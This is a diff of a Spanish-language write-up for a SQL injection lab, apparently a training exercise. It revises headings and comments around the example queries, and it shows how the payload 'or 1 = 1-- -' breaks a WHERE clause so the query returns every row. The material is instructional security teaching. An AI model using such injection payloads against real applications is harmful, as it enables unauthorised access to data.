@@ -18,16 +18,18 @@ To solve the lab, perform a SQL injection attack that causes the application to 
 
 
 
-### Query original
+### Query original:
 
 El payload se inyecta en donde se pone el nombre del artículo o sección:
 
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0b35f1ca-3c73-4837-a0f8-b5be87e084bf)
 
+### Ejemplo con lab:
+
 En realidad el query está diseñado para solo arrojar un resultado específico, por ejemplo:
 
 ````sql
-# Ejemplo Original: "Vida real", con un query adicional
+# Ejemplo Original: 
 select id,username from users where subscription = '1' and id = 5;
 ````
 ````py
@@ -47,7 +49,7 @@ select id,username from users where subscription = '1' and id = 5;
 - Con el payload `or 1 = 1-- -'` o `or 1 = 1'-- -` _(o alguna de sus variantes de comentarios)_ es como "romperé" el query:
 
 ````sql
-# Ejemplo Final: "Vida real", con un query adicional
+# Ejemplo Final: (ya con SQLi)
 select id,username from users where subscription = '1' or 1 = 1;-- -' and id = 5 (aqui incluso puede ir otro query original que elimino, ya que es un comentario!!! :P);
 ````
 ````py
